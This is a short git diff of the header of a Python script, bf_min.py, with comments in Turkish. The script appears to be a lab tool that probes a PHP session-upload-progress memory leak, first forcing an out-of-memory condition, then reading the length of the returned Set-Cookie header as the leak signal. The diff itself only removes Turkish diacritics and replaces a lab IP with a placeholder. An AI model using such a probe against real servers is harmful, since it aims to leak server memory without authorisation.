@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
-"""EN BASİT brute force — 2 istek, en basit sinyal.
+"""EN BASIT brute force — 2 istek, en basit sinyal.
 
-Step 1: OOM (tek büyük field, size vary)
+Step 1: OOM (tek buyuk field, size vary)
 Step 2: SIMPLE session-init (PHPSESSID + PROGRESS, no shapers)
 Signal: Set-Cookie length (32B=clean, >32B=leak)
 
-Hızlı: her iterasyon <1s.
+Hizli: her iterasyon <1s.
 
 Usage:
   python3 bf_min.py --port 18113 --sizes 1,2,4,8,16,32,64,128,256
@@ -20,7 +20,7 @@ from common import (Target, build_multipart, parse_cookie,
 
 def main() -> int:
     ap = argparse.ArgumentParser()
-    ap.add_argument("--host", default="192.168.8.123")
+    ap.add_argument("--host", default="LAB_IP")
     ap.add_argument("--port", type=int, default=18113)
     ap.add_argument("--sizes", default="1,2,4,8,16,32,64,128,256")
     args = ap.parse_args()
